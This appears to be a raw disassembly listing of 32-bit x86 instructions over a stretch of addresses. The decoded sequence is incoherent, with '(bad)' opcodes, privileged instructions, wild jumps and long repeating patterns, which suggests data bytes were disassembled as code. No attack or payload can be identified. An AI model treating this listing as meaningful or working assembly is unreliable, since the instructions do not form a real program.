  413eb1:	bound  ebx,QWORD PTR [eax+0x62]
  413eb4:	inc    ecx
  413eb5:	inc    eax
  413eb6:	retf   
  413eb7:	jnp    0x413ec1
  413eb9:	inc    ebx
  413eba:	mov    bl,BYTE PTR [edx-0x6d]
  413ebd:	ins    DWORD PTR es:[edi],dx
  413ebe:	push   edi
  413ebf:	shl    BYTE PTR [edx-0x2f],cl
  413ec2:	pop    edi
  413ec3:	shr    DWORD PTR [ebx-0x13],1
  413ec6:	inc    esp
  413ec7:	inc    ebp
  413ec8:	adc    bh,al
  413eca:	mov    eax,0x6e547fbf
  413ecf:	xor    al,0x50
  413ed1:	enter  0x2c8a,0x55
  413ed5:	clc    
  413ed6:	fadd   st(0),st
  413ed8:	gs pop esi
  413eda:	outs   dx,BYTE PTR ds:[esi]
  413edb:	lahf   
  413edc:	push   ecx
  413edd:	jo     0x413f3c
  413edf:	cmp    BYTE PTR ds:0x7543128e,al
  413ee5:	aad    0x45
  413ee7:	jl     0x413e70
  413ee9:	inc    ecx
  413eea:	sti    
  413eeb:	xchg   ecx,eax
  413eec:	cmc    
  413eed:	push   edx
  413eee:	adc    BYTE PTR [edx+0x40],ah
  413ef1:	inc    ecx
  413ef2:	and    eax,0x40000500
  413ef7:	inc    ebx
  413ef8:	add    eax,0x40624041
  413efd:	inc    ebx
  413efe:	add    eax,0x43402541
  413f03:	bound  eax,QWORD PTR [eax+0x43]
  413f06:	int3   
  413f07:	inc    eax
  413f08:	bound  eax,QWORD PTR [eax]
  413f0a:	inc    ecx
  413f0b:	inc    eax
  413f0c:	inc    eax
  413f0d:	add    eax,0xf87aa505
  413f12:	inc    ebx
  413f13:	lods   eax,DWORD PTR ds:[esi]
  413f14:	sbb    al,0xe8
  413f16:	aad    0x78
  413f18:	icebp  
  413f19:	or     eax,0x731be930
  413f1e:	js     0x413ede
  413f20:	or     ecx,ecx
  413f22:	int3   
  413f23:	dec    ebx
  413f24:	dec    esp
  413f25:	sub    esi,ecx
  413f27:	and    eax,0x9447989c
  413f2c:	push   ebx
  413f2d:	repz inc esp
  413f2f:	push   0x208543f8
  413f34:	push   esp
  413f35:	aas    
  413f36:	sub    al,0x97
  413f38:	in     al,0x7e
  413f3a:	inc    ebx
  413f3b:	pop    ebx
  413f3c:	adc    BYTE PTR [ebp+0x62],ah
  413f3f:	inc    eax
  413f40:	and    eax,0x5406600
  413f45:	inc    ebx
  413f46:	inc    ecx
  413f47:	inc    eax
  413f48:	inc    eax
  413f49:	inc    ebx
  413f4a:	add    BYTE PTR [eax],al
  413f4c:	add    BYTE PTR [edx-0x34],ah
  413f4f:	inc    eax
  413f50:	add    eax,0x40004041
  413f55:	inc    ecx
  413f56:	int3   
  413f57:	add    BYTE PTR [ebx-0x7c],al
  413f5a:	add    eax,0x5406240
  413f5f:	bound  edx,QWORD PTR [edx-0x6fb3c558]
  413f65:	mov    BYTE PTR [eax],cl
  413f67:	jns    0x413fd1
  413f69:	adc    dh,dl
  413f6b:	fs fs jecxz 0x413faf
  413f6f:	dec    eax
  413f70:	mov    eax,ds:0x43fc11b8
  413f75:	daa    
  413f76:	push   ecx
  413f77:	icebp  
  413f78:	jo     0x413fbc
  413f7a:	jmp    0x3ad1084
  413f7f:	sbb    al,0xd4
  413f81:	pop    esp
  413f82:	loope  0x413f0b
  413f84:	jns    0x413fa4
  413f86:	pop    ds
  413f87:	xor    eax,0x40523c52
  413f8c:	popf   
  413f8d:	jae    0x413f4a
  413f8f:	bound  ebp,QWORD PTR [eax+0x40]
  413f92:	bound  ebx,QWORD PTR [eax+0x41]
  413f95:	add    eax,0x40404340
  413f9a:	inc    ebx
  413f9b:	inc    eax
  413f9c:	test   BYTE PTR [eax],al
  413f9e:	add    eax,0x40624041
  413fa3:	inc    eax
  413fa4:	add    BYTE PTR [edx+0x5],ah
  413fa7:	inc    ebx
  413fa8:	add    BYTE PTR [eax+0x78],al
  413fab:	inc    ecx
  413fac:	add    BYTE PTR [eax+0x41],bl
  413faf:	bound  eax,QWORD PTR [ecx-0x60]
  413fb2:	inc    ecx
  413fb3:	xor    al,0x98
  413fb5:	add    esi,ebx
  413fb7:	mov    al,ds:0xcd09499b
  413fbc:	jbe    0x413fdd
  413fbe:	pop    ebx
  413fbf:	jo     0x413f82
  413fc1:	push   edx
  413fc2:	pop    eax
  413fc3:	inc    ecx
  413fc4:	pop    DWORD PTR [ebx]
  413fc6:	push   ebx
  413fc7:	aam    0x12
  413fc9:	shl    DWORD PTR [edx+0x43],0x3
  413fcd:	pop    ds
  413fce:	pop    ebx
  413fcf:	push   edx
  413fd0:	lods   al,BYTE PTR ds:[esi]
  413fd1:	sub    DWORD PTR [esi+0x30],edi
  413fd4:	repnz add ebx,DWORD PTR [edi+0x40]
  413fd8:	test   BYTE PTR [eax],al
  413fda:	int3   
  413fdb:	bound  eax,QWORD PTR ds:0xcc840f41
  413fe1:	inc    ebx
  413fe2:	add    BYTE PTR [eax+0x0],al
  413fe5:	inc    eax
  413fe6:	inc    eax
  413fe7:	inc    eax
  413fe8:	int3   
  413fe9:	add    BYTE PTR ds:0x62404341,al
  413fef:	pop    eax
  413ff0:	add    BYTE PTR [ebx+0x40],al
  413ff3:	bound  ecx,QWORD PTR [edi]
  413ff5:	inc    eax
  413ff6:	inc    ebp
  413ff7:	adc    eax,0x82c84cab
  413ffc:	pop    ds
  413ffd:	rol    DWORD PTR [eax-0x33],0xb4
  414001:	fs inc edi
  414003:	add    BYTE PTR [eax+0x35],cl
  414006:	imul   eax,DWORD PTR [eax+0x5],0x3f8e85f0
  41400d:	cwde   
  41400e:	mov    WORD PTR [edx],gs
  414010:	retf   
  414011:	outs   dx,BYTE PTR ds:[esi]
  414012:	inc    ebx
  414013:	cli    
  414014:	dec    eax
  414015:	push   ecx
  414016:	int    0x43
  414018:	inc    ebp
  414019:	inc    ebp
  41401a:	nop
  41401b:	(bad)  
  41401c:	mov    edi,0x430a45bf
  414021:	arpl   WORD PTR [ecx],ax
  414023:	cmc    
  414024:	add    esp,DWORD PTR [ebp-0xe]
  414027:	mov    BYTE PTR [ecx+0x1f1e4337],dl
  41402d:	add    BYTE PTR [eax],al
  41402f:	inc    eax
  414030:	inc    eax
  414031:	cmovno eax,DWORD PTR ds:0x40056243
  414038:	int3   
  414039:	add    ah,cl
  41403b:	inc    eax
  41403c:	inc    eax
  41403d:	bound  eax,QWORD PTR [ecx+0x0]
  414040:	add    BYTE PTR [edi],cl
  414042:	inc    ebx
  414043:	inc    eax
  414044:	inc    eax
  414045:	add    BYTE PTR [ecx+0x43],al
  414048:	add    eax,0x40256240
  41404d:	bound  eax,QWORD PTR [eax]
  41404f:	rcr    DWORD PTR [edi+0x1e],1
  414052:	clc    
  414053:	jle    0x414026
  414055:	inc    ebp
  414056:	jno    0x4140d5
  414058:	and    BYTE PTR [edi+esi*2],dh
  41405b:	dec    ebp
  41405c:	push   ds
  41405d:	xchg   edx,eax
  41405e:	js     0x4140b3
  414060:	mov    al,BYTE PTR [eax+0x642d6f7c]
  414066:	es jns 0x4140d1
  414069:	lds    ebp,FWORD PTR [ebx-0x13]
  41406c:	inc    edx
  41406d:	idiv   BYTE PTR [esi+0x6391a1d3]
  414073:	jle    0x41402f
  414075:	addr16 dec ecx
  414077:	fidiv  WORD PTR [eax+0x42]
  41407a:	fcomp  QWORD PTR [ecx]
  41407c:	inc    ecx
  41407d:	mov    ecx,esi
  41407f:	aad    0xd4
  414081:	inc    ebp
  414082:	popa   
  414083:	(bad)  
  414084:	inc    ebx
  414085:	mov    ss,WORD PTR [ebx]
  414087:	dec    edi
  414088:	push   edx
  414089:	and    al,0x5
  41408b:	add    ah,cl
  41408d:	inc    eax
  41408e:	inc    ecx
  41408f:	inc    eax
  414090:	inc    ebx
  414091:	bound  esp,QWORD PTR ds:0x41400043
  414097:	add    BYTE PTR [eax],al
  414099:	add    eax,0x43624062
  41409e:	inc    ecx
  41409f:	inc    eax
  4140a0:	inc    eax
  4140a1:	inc    eax
  4140a2:	add    eax,0x40624340
  4140a7:	add    eax,0x40664140
  4140ac:	ins    BYTE PTR es:[edi],dx
  4140ad:	push   0x30
  4140af:	xchg   DWORD PTR [eax-0xf],edx
  4140b2:	push   0xc43b65f0
  4140b7:	dec    esp
  4140b8:	ins    DWORD PTR es:[edi],dx
  4140b9:	mov    BYTE PTR [eax+0x4784f2c8],ah
  4140bf:	ret    
  4140c0:	pop    esi
  4140c1:	icebp  
  4140c2:	jo     0x414109
  4140c4:	stos   DWORD PTR es:[edi],eax
  4140c5:	bound  eax,QWORD PTR [ebp-0x2baace22]
  4140cb:	es inc ebx
  4140cd:	add    BYTE PTR ds:0x41107840,al
  4140d3:	bound  eax,QWORD PTR [eax+0x40]
  4140d6:	sldt   WORD PTR [eax-0x34]
  4140da:	js     0x41413e
  4140dc:	add    eax,0x40664143
  4140e1:	inc    ebx
  4140e2:	add    BYTE PTR [ecx+0x5],al
  4140e5:	js     0x414127
  4140e7:	bound  eax,QWORD PTR [eax+0x0]
  4140ea:	inc    eax
  4140eb:	inc    edx
  4140ec:	fiadd  WORD PTR [ebx-0x50]
  4140ef:	sub    dh,BYTE PTR [ecx+0x25ab4152]
  4140f5:	nop
  4140f6:	cmp    BYTE PTR [ebx-0x40],dl
  4140f9:	xor    eax,0x1efd41a8
  4140fe:	mov    cl,0xda
  414100:	rol    eax,1
  414102:	jns    0x4140e0
  414104:	imul   eax,DWORD PTR [edi-0x29],0x266dbfd1
  41410b:	xor    al,0xdf
  41410d:	(bad)
  414110:	pop    edi
  414111:	loopne 0x414154
  414113:	arpl   sp,bx
  414115:	push   esi
  414116:	jmp    0x2a935670
  41411b:	add    eax,0x47d0395
  414120:	sub    al,0xc5
  414122:	adc    al,BYTE PTR [edi+0x4341ca8c]
  414128:	inc    eax
  414129:	inc    eax
  41412a:	add    eax,0x434162
  41412f:	inc    eax
  414130:	add    BYTE PTR [edx+0x5],ah
  414133:	inc    eax
  414134:	adc    BYTE PTR [edx+0x40],ah
  414137:	inc    ebx
  414138:	inc    ecx
  414139:	add    eax,0x4340
  41413e:	add    eax,0x404162
  414143:	add    BYTE PTR [eax+0x43],al
  414146:	inc    eax
  414147:	add    eax,0x62985f7e
  41414c:	test   al,0x49
  41414e:	sub    BYTE PTR [eax+0x21],ah
  414151:	lahf   
  414152:	inc    ebx
  414153:	in     eax,dx
  414154:	adc    eax,0x5941acab
  414159:	add    al,0x1f
  41415b:	dec    eax
  41415c:	retf   
  41415d:	mov    eax,0x5f4543c3
  414162:	aaa    
  414163:	cmp    al,0x40
  414165:	add    BYTE PTR [eax],al
  414167:	inc    ecx
  414168:	inc    ebx
  414169:	add    eax,0x41784062
  41416e:	inc    eax
  41416f:	inc    eax
  414170:	add    BYTE PTR [edi],cl
  414172:	bound  eax,QWORD PTR [ebx+0x0]
  414175:	add    eax,0x25006240
  41417a:	inc    eax
  41417b:	add    eax,0x40254143
  414180:	add    eax,0x43620000
  414185:	or     eax,0x7aca3025
  41418a:	dec    ebp
  41418b:	cmp    BYTE PTR [ebx],0xc9
  41418e:	call   esp
  414190:	push   edx
  414191:	lahf   
  414192:	adc    eax,0x4c907456
  414197:	inc    edi
  414198:	sub    BYTE PTR [esi+ecx*2],al
  41419b:	lods   eax,DWORD PTR ds:[esi]
  41419c:	bound  eax,QWORD PTR [ecx-0x10]
  41419f:	test   DWORD PTR [esi],ebp
  4141a1:	pop    edi
  4141a2:	cmp    eax,0x670c8770
  4141a7:	inc    ebx
  4141a8:	sbb    eax,DWORD PTR [ebx+0x0]
  4141ab:	add    BYTE PTR [eax],al
  4141ad:	inc    ecx
  4141ae:	inc    eax
  4141af:	bound  esp,QWORD PTR [esi+0x0]
  4141b2:	inc    eax
  4141b3:	add    eax,0x5400000
  4141b8:	inc    ecx
  4141b9:	inc    eax
  4141ba:	inc    eax
  4141bb:	bound  esp,QWORD PTR ds:0x25050043
  4141c1:	inc    ecx
  4141c2:	inc    ebx
  4141c3:	inc    eax
  4141c4:	test   BYTE PTR [eax+0x0],al
  4141c7:	bound  ebx,QWORD PTR [eax+0x62]
  4141ca:	inc    ecx
  4141cb:	inc    eax
  4141cc:	jp     0x41421d
  4141ce:	mov    ah,0xdc
  4141d0:	int    0x4a
  4141d2:	nop
  4141d3:	repnz pop ds
  4141d5:	xor    eax,0x4c484752
  4141da:	cmp    ecx,DWORD PTR [eax-0x2b]
  4141dd:	dec    ecx
  4141de:	int    0xd4
  4141e0:	inc    eax
  4141e1:	ins    BYTE PTR es:[edi],dx
  4141e2:	test   al,0x7c
  4141e4:	std    
  4141e5:	jae    0x41421b
  4141e7:	aad    0x4
  4141e9:	sub    al,0x40
  4141eb:	inc    ebx
  4141ec:	imul   ebp,DWORD PTR [edi+0x406210e5],0x41
  4141f3:	and    eax,0x40000500
  4141f8:	inc    ebx
  4141f9:	add    eax,0x40624041
  4141fe:	inc    ebx
  4141ff:	add    eax,0x43402541
  414204:	bound  eax,QWORD PTR [eax+0x43]
  414207:	int3   
  414208:	inc    eax
  414209:	bound  eax,QWORD PTR [eax]
  41420b:	inc    ecx
  41420c:	inc    eax
  41420d:	inc    eax
  41420e:	add    eax,0xdc674705
  414213:	sub    ch,BYTE PTR [esi]
  414215:	push   ebx
  414216:	adc    BYTE PTR [ebp+0x35],ah
  414219:	dec    edx
  41421a:	mov    WORD PTR [edi+0x2d],es
  41421d:	rcl    edi,1
  41421f:	out    dx,eax
  414220:	nop
  414221:	mov    eax,0xd1ca2a49
  414226:	push   esp
  414227:	test   BYTE PTR [esi],dh
  414229:	or     eax,0x201df951
  41422e:	jno    0x414292
  414230:	and    DWORD PTR [ebx],ebp
  414232:	jae    0x41422b
  414234:	jecxz  0x4142a7
  414236:	clc    
  414237:	push   esi
  414238:	call   0x1f8d8b93
  41423d:	mov    edi,0x3fc0acd1
  414242:	fcomp  QWORD PTR [esi+0x6a]
  414245:	repz pop edi
  414247:	jo     0x414290
  414249:	jns    0x4142b2
  41424b:	inc    edi
  41424c:	jecxz  0x414201
  41424e:	bound  eax,QWORD PTR [eax+0x25]
  414251:	add    BYTE PTR [esi+0x40],ah
  414254:	add    eax,0x40404143
  414259:	inc    ebx
  41425a:	add    BYTE PTR [eax],al
  41425c:	add    BYTE PTR [edx-0x34],ah
  41425f:	inc    eax
  414260:	add    eax,0x40004041
  414265:	inc    ecx
  414266:	int3   
  414267:	add    BYTE PTR [ebx-0x7c],al
  41426a:	add    eax,0x5406240
  41426f:	bound  edx,QWORD PTR [ebp+0x41b836a8]
  414275:	inc    ebx
  414276:	fwait
  414277:	push   0x47
  414279:	push   edx
  41427a:	imul   eax,ebx,0x7d
  41427d:	xor    BYTE PTR [esi-0x57c26d0b],dl
  414283:	inc    edx
  414284:	jo     0x414246
  414286:	sub    cl,BYTE PTR [edx+0x6e]
  414289:	mov    ah,0x41
  41428b:	(bad)  
  41428c:	jl     0x4142d5
  41428e:	lahf   
  41428f:	mov    cl,0x48
  414291:	jo     0x4142bd
  414293:	dec    edi
  414294:	cmp    al,0x85
  414296:	inc    eax
  414297:	bound  ebx,QWORD PTR [eax+0x41]
  41429a:	add    eax,0x40404340
  41429f:	inc    ebx
  4142a0:	inc    eax
  4142a1:	test   BYTE PTR [eax],al
  4142a3:	add    eax,0x40624041
  4142a8:	inc    eax
  4142a9:	add    BYTE PTR [edx+0x5],ah
  4142ac:	inc    ebx
  4142ad:	add    BYTE PTR [eax+0x78],al
  4142b0:	inc    ecx
  4142b1:	add    BYTE PTR [eax+0x41],bl
  4142b4:	bound  ecx,QWORD PTR [ecx+0x6a]
  4142b7:	push   eax
  4142b8:	test   al,0x48
  4142ba:	mov    esp,0xf5dd4363
  4142bf:	sub    eax,0x5a4a2a52
  4142c4:	nop
  4142c5:	pop    edi
  4142c6:	pop    edx
  4142c7:	mov    edx,0xf43c4363
  4142cc:	fcom   st(5)
  4142ce:	jae    0x414315
  4142d0:	mov    esp,0x437060b3
  4142d5:	pop    edx
  4142d6:	add    esi,edx
  4142d8:	jo     0x41430e
  4142da:	push   edx
  4142db:	or     cl,dl
  4142dd:	dec    esi
  4142de:	xor    ebp,DWORD PTR [esi-0x58]
  4142e1:	xor    eax,0xaba514cb
  4142e6:	push   ebx
  4142e7:	dec    edx
  4142e8:	push   edx
  4142e9:	int3   
  4142ea:	fs inc eax
  4142ec:	test   BYTE PTR [eax],al
  4142ee:	int3   
  4142ef:	bound  eax,QWORD PTR ds:0xcc840f41
  4142f5:	inc    ebx
  4142f6:	add    BYTE PTR [eax+0x0],al
  4142f9:	inc    eax
  4142fa:	inc    eax
  4142fb:	inc    eax
  4142fc:	int3   
  4142fd:	add    BYTE PTR ds:0x62404341,al
  414303:	pop    eax
  414304:	add    BYTE PTR [ebx+0x40],al
  414307:	bound  ecx,QWORD PTR [edi]
  414309:	inc    eax
  41430a:	bound  ebx,QWORD PTR [ecx-0x11]
  41430d:	mov    cl,0x5a
  41430f:	lds    esp,FWORD PTR [ebx+0x3c]
  414312:	dec    esp
  414313:	pop    ebp
  414314:	pop    ebp
  414315:	and    ch,BYTE PTR gs:[ecx+0x40]
  414319:	jo     0x414303
  41431b:	fs and esi,ebp
  41431e:	inc    edx
  41431f:	std    
  414320:	sar    BYTE PTR [ecx-0x4090bea5],0xb3
  414327:	arpl   WORD PTR [eax-0x3d],ax
  41432a:	dec    eax
  41432b:	inc    ebx
  41432c:	not    bl
  41432e:	inc    ecx
  41432f:	cmp    al,0x28
  414331:	inc    ebx
  414332:	xchg   ecx,eax
  414333:	add    BYTE PTR [eax],al
  414335:	inc    eax
  414336:	inc    eax
  414337:	cmovno eax,DWORD PTR ds:0x40056243
  41433e:	int3   
  41433f:	add    ah,cl
  414341:	inc    eax
  414342:	inc    eax
  414343:	bound  eax,QWORD PTR [ecx+0x0]
  414346:	add    BYTE PTR [edi],cl
  414348:	inc    ebx
  414349:	inc    eax
  41434a:	inc    eax
  41434b:	add    BYTE PTR [ecx+0x43],al
  41434e:	add    eax,0x40256240
  414353:	bound  eax,QWORD PTR [eax]
  414355:	xor    BYTE PTR [ebx],al
  414357:	pop    ds
  414358:	push   eax
  414359:	test   BYTE PTR [eax+0x49],0x74
  41435d:	cmp    al,0xc5
  41435f:	pop    esi
  414360:	xor    edx,DWORD PTR [ecx+0x2a]
  414363:	test   al,0x7e
  414365:	inc    edi
  414366:	aaa    
  414367:	cmc    
  414368:	inc    ecx
  414369:	mov    ebp,0x85d06710
  41436e:	out    0x5d,al
  414370:	cmp    esi,DWORD PTR [eax-0x58]
  414373:	jge    0x4143dd
  414375:	inc    ebx
  414376:	mov    ds:0xcc000537,eax
  41437b:	inc    eax
  41437c:	inc    ecx
  41437d:	inc    eax
  41437e:	inc    ebx
  41437f:	bound  esp,QWORD PTR ds:0x41400043
  414385:	add    BYTE PTR [eax],al
  414387:	add    eax,0x43624062
  41438c:	inc    ecx
  41438d:	inc    eax
  41438e:	inc    eax
  41438f:	inc    eax
  414390:	add    eax,0x40624340
  414395:	add    eax,0x40664140
  41439a:	in     eax,dx
  41439b:	test   al,0x5
  41439d:	xor    ebp,DWORD PTR [ebx-0x2ac4b70]
  4143a3:	push   edx
  4143a4:	int    0xb4
  4143a6:	mov    esp,0xd5d5fcf5
  4143ab:	dec    eax
  4143ac:	adc    dl,BYTE PTR ds:0x53684373
  4143b2:	jo     0x414370
  4143b4:	pushf  
  4143b5:	jnp    0x4143e6
  4143b7:	ror    DWORD PTR [esi-0x21],1
  4143ba:	xchg   ecx,eax
  4143bb:	jo     0x4143d2
  4143bd:	inc    edx
  4143be:	dec    eax
  4143bf:	sub    al,0xb0
  4143c1:	inc    ebx
  4143c2:	add    BYTE PTR ds:0x41107840,al
  4143c8:	bound  eax,QWORD PTR [eax+0x40]
  4143cb:	sldt   WORD PTR [eax-0x34]
  4143cf:	js     0x414433
  4143d1:	add    eax,0x40664143
  4143d6:	inc    ebx
  4143d7:	add    BYTE PTR [ecx+0x5],al
  4143da:	js     0x41441c
  4143dc:	bound  eax,QWORD PTR [eax+0x0]
  4143df:	inc    eax
  4143e0:	push   ebx
  4143e1:	xor    DWORD PTR [eax-0x7f03e633],ebp
  4143e7:	fist   WORD PTR [edx+0x6ae04b52]
  4143ee:	fmul   st,st(4)
  4143f0:	push   edx
  4143f1:	sub    al,ch
  4143f3:	aam    0x64
  4143f5:	inc    ecx
  4143f6:	mov    ch,0x8b
  4143f8:	icebp  
  4143f9:	inc    eax
  4143fa:	leave  
  4143fb:	int3   
  4143fc:	inc    ecx
  4143fd:	cmp    al,0x41
  4143ff:	inc    ebx
  414400:	inc    eax
  414401:	inc    eax
  414402:	add    eax,0x434162
  414407:	inc    eax
  414408:	add    BYTE PTR [edx+0x5],ah
  41440b:	inc    eax
  41440c:	adc    BYTE PTR [edx+0x40],ah
  41440f:	inc    ebx
  414410:	inc    ecx
  414411:	add    eax,0x4340
  414416:	add    eax,0x404162
  41441b:	add    BYTE PTR [eax+0x43],al
  41441e:	inc    eax
  41441f:	add    eax,0x2f4f5f41
  414424:	add    eax,0x4378fc63
  414429:	cmp    esi,DWORD PTR [ebx+0xb]
  41442c:	xor    DWORD PTR gs:[ecx+0x44],0x12bf3030
  414434:	jo     0x4143d2
  414436:	push   edx
  414437:	inc    edx
  414438:	cmp    BYTE PTR [ecx+edx*1+0x32],bl
  41443c:	test   al,0xf9
  41443e:	inc    esp
  41443f:	mov    ebp,0xa2937747
  414444:	push   edx
  414445:	inc    eax
  414446:	add    BYTE PTR [eax],al
  414448:	inc    ecx
  414449:	inc    ebx
  41444a:	add    eax,0x41784062
  41444f:	inc    eax
  414450:	inc    eax
  414451:	add    BYTE PTR [edi],cl
  414453:	bound  eax,QWORD PTR [ebx+0x0]
  414456:	add    eax,0x25006240
  41445b:	inc    eax
  41445c:	add    eax,0x40254143
  414461:	add    eax,0xd4620000
  414466:	and    al,0x6d
  414468:	test   DWORD PTR [edi],ebx
  41446a:	push   0xfffffff9
  41446c:	aad    0x93
  41446e:	push   0x510543cf
  414473:	mov    dl,0x36
  414475:	ds pop ss
  414477:	mov    ah,0x90
  414479:	stos   BYTE PTR es:[edi],al
  41447a:	inc    edx
  41447b:	outs   dx,BYTE PTR ds:[esi]
  41447c:	or     DWORD PTR ds:0xad926234,esi
  414482:	adc    DWORD PTR [eax+0x64],eax
  414485:	xchg   ecx,eax
  414486:	loopne 0x4144fa
  414488:	inc    ebx
  414489:	aas    
  41448a:	jo     0x4144de
  41448c:	cli    
  41448d:	dec    edx
  41448e:	mov    esi,0x7a32d1e8
  414493:	aaa    
  414494:	jo     0x41445b
  414496:	rol    DWORD PTR [ebx+0x0],0x0
  41449a:	add    BYTE PTR [ecx+0x40],al
  41449d:	bound  esp,QWORD PTR [esi+0x0]
  4144a0:	inc    eax
  4144a1:	add    eax,0x5400000
  4144a6:	inc    ecx
  4144a7:	inc    eax
  4144a8:	inc    eax
  4144a9:	bound  esp,QWORD PTR ds:0x25050043
  4144af:	inc    ecx
  4144b0:	inc    ebx
  4144b1:	inc    eax
  4144b2:	test   BYTE PTR [eax+0x0],al
  4144b5:	bound  ebx,QWORD PTR [eax+0x62]
  4144b8:	inc    ecx
  4144b9:	inc    eax
  4144ba:	ds dec ebx
  4144bc:	pusha  
  4144bd:	cs std 
  4144bf:	test   eax,0x9441d4c8
  4144c4:	xor    al,0x53
  4144c6:	pop    ds
  4144c7:	push   edx
  4144c8:	dec    edx
  4144c9:	fidivr DWORD PTR ds:0x7b39a544
  4144cf:	ins    BYTE PTR es:[edi],dx
  4144d0:	and    eax,0x35e76465
  4144d5:	adc    dh,BYTE PTR [ecx-0x44]
  4144d8:	sub    ecx,ebx
  4144da:	pusha  
  4144db:	inc    ecx
  4144dc:	sub    BYTE PTR [edi],bh
  4144de:	adc    al,0x70
  4144e0:	test   al,0x61
  4144e2:	and    al,0x43
  4144e4:	retf   0xb718
  4144e7:	test   al,0x60
  4144e9:	jl     0x41452c
  4144eb:	xor    BYTE PTR [edi],bl
  4144ed:	mov    bl,0x2c
  4144ef:	push   edx
  4144f0:	cs cmp ax,0xef34
  4144f5:	adc    BYTE PTR [edx+0x40],ah
  4144f8:	inc    ecx
  4144f9:	and    eax,0x40000500
  4144fe:	inc    ebx
  4144ff:	add    eax,0x40624041
  414504:	inc    ebx
  414505:	add    eax,0x43402541
  41450a:	bound  eax,QWORD PTR [eax+0x43]
  41450d:	int3   
  41450e:	inc    eax
  41450f:	bound  eax,QWORD PTR [eax]
  414511:	inc    ecx
  414512:	inc    eax
  414513:	inc    eax
  414514:	add    eax,0xc599b705
  414519:	adc    al,BYTE PTR [edx+0x74]
  41451c:	inc    edi
  41451d:	pop    es
  41451e:	aas    
  41451f:	out    dx,eax
  414520:	or     edx,DWORD PTR [eax+0x3c]
  414523:	and    al,0x85
  414525:	neg    BYTE PTR [edi+0x55adc103]
  41452b:	add    BYTE PTR [eax+0x5d],ah
  41452e:	pusha  
  41452f:	jno    0x414596
  414531:	ds pusha 
  414533:	push   edx
  414534:	lock repz mov cl,0x90
  414538:	jo     0x41454b
  41453a:	fiadd  WORD PTR [ecx-0x5c]
  41453d:	es dec esp
  41453f:	push   ebx
  414540:	test   al,0xb4
  414542:	inc    edx
  414543:	cmp    al,0xaf
  414545:	bound  eax,QWORD PTR [eax+0x25]
  414548:	add    BYTE PTR [esi+0x40],ah
  41454b:	add    eax,0x40404143
  414550:	inc    ebx
  414551:	add    BYTE PTR [eax],al
  414553:	add    BYTE PTR [edx-0x34],ah
  414556:	inc    eax
  414557:	add    eax,0x40004041
  41455c:	inc    ecx
  41455d:	int3   
  41455e:	add    BYTE PTR [ebx-0x7c],al
  414561:	add    eax,0x5406240
  414566:	bound  ebx,QWORD PTR [edx+0xd524954]
  41456c:	cmp    eax,0xcf6434d
  414571:	ror    DWORD PTR ds:0xd26054cb,1
  414577:	xchg   DWORD PTR [eax+0x3],eax
  41457a:	mov    ah,0x41
  41457c:	pusha  
  41457d:	inc    ecx
  41457e:	mov    edi,0x7097554b
  414583:	ins    BYTE PTR es:[edi],dx
  414584:	fadd   QWORD PTR fs:[eax+0x47]
  414588:	inc    eax
  414589:	bound  ebx,QWORD PTR [eax+0x41]
  41458c:	add    eax,0x40404340
  414591:	inc    ebx
  414592:	inc    eax
  414593:	test   BYTE PTR [eax],al
  414595:	add    eax,0x40624041
  41459a:	inc    eax
  41459b:	add    BYTE PTR [edx+0x5],ah
  41459e:	inc    ebx
  41459f:	add    BYTE PTR [eax+0x78],al
  4145a2:	inc    ecx
  4145a3:	add    BYTE PTR [eax+0x41],bl
  4145a6:	bound  edx,QWORD PTR [ecx+0xc]
  4145a9:	test   al,0xe8
  4145ab:	inc    edx
  4145ac:	outs   dx,DWORD PTR ds:[esi]
  4145ad:	icebp  
  4145ae:	adc    bh,BYTE PTR [edi]
  4145b0:	xchg   edi,eax
  4145b1:	push   edx
  4145b2:	bound  edi,QWORD PTR ds:0xc36cb613
  4145b8:	inc    eax
  4145b9:	arpl   WORD PTR [edx],dx
  4145bb:	jb     0x4145a9
  4145bd:	inc    ecx
  4145be:	xchg   ebx,eax
  4145bf:	call   0x84:0x40a0bc31
  4145c6:	int3   
  4145c7:	bound  eax,QWORD PTR ds:0xcc840f41
  4145cd:	inc    ebx
  4145ce:	add    BYTE PTR [eax+0x0],al
  4145d1:	inc    eax
  4145d2:	inc    eax
  4145d3:	inc    eax
  4145d4:	int3   
  4145d5:	add    BYTE PTR ds:0x62404341,al
  4145db:	pop    eax
  4145dc:	add    BYTE PTR [ebx+0x40],al
  4145df:	bound  ecx,QWORD PTR [edi]
  4145e1:	inc    eax
  4145e2:	sbb    DWORD PTR [ebx+eax*2+0x70f834a7],eax
  4145e9:	adc    eax,0x3d30a842
  4145ee:	scas   al,BYTE PTR es:[edi]
  4145ef:	mov    cl,0xa8
  4145f1:	int    0x3d
  4145f3:	adc    BYTE PTR [eax],dh
  4145f5:	rcl    DWORD PTR [esi+0x61],1
  4145f8:	push   edx
  4145f9:	adc    DWORD PTR [edx+0x26],eax
  4145fc:	inc    edi
  4145fd:	or     eax,0xa4c57492
  414602:	pusha  
  414603:	and    eax,DWORD PTR [ebp-0x3740cd3d]
  414609:	or     eax,0xa843c942
  41460e:	enter  0xd137,0xcd
  414612:	enter  0x9051,0x72
  414616:	xor    al,0x7f
  414618:	add    BYTE PTR gs:[eax],al
  41461b:	inc    eax
  41461c:	inc    eax
  41461d:	cmovno eax,DWORD PTR ds:0x40056243
  414624:	int3   
  414625:	add    ah,cl
  414627:	inc    eax
  414628:	inc    eax
  414629:	bound  eax,QWORD PTR [ecx+0x0]
  41462c:	add    BYTE PTR [edi],cl
  41462e:	inc    ebx
  41462f:	inc    eax
  414630:	inc    eax
  414631:	add    BYTE PTR [ecx+0x43],al
  414634:	add    eax,0x40256240
  414639:	bound  eax,QWORD PTR [eax]
  41463b:	inc    eax
  41463c:	jae    0x414609
  41463e:	dec    esp
  41463f:	test   BYTE PTR [ecx],0x11
  414642:	jo     0x414684
  414644:	mov    esp,0x40cb43bc
  414649:	push   ecx
  41464a:	test   al,0x41
  41464c:	loopne 0x41468f
  41464e:	sar    DWORD PTR [eax+eiz*2],1
  414651:	xor    BYTE PTR [edx+0x4e],dl
  414654:	arpl   WORD PTR [ecx],si
  414656:	lock shl DWORD PTR [ecx+0x6d],0x23
  41465b:	les    edi,FWORD PTR [edi-0x33fffaec]
  414661:	inc    eax
  414662:	inc    ecx
  414663:	inc    eax
  414664:	inc    ebx
  414665:	bound  esp,QWORD PTR ds:0x41400043
  41466b:	add    BYTE PTR [eax],al
  41466d:	add    eax,0x43624062
  414672:	inc    ecx
  414673:	inc    eax
  414674:	inc    eax
  414675:	inc    eax
  414676:	add    eax,0x40624340
  41467b:	add    eax,0x40664140
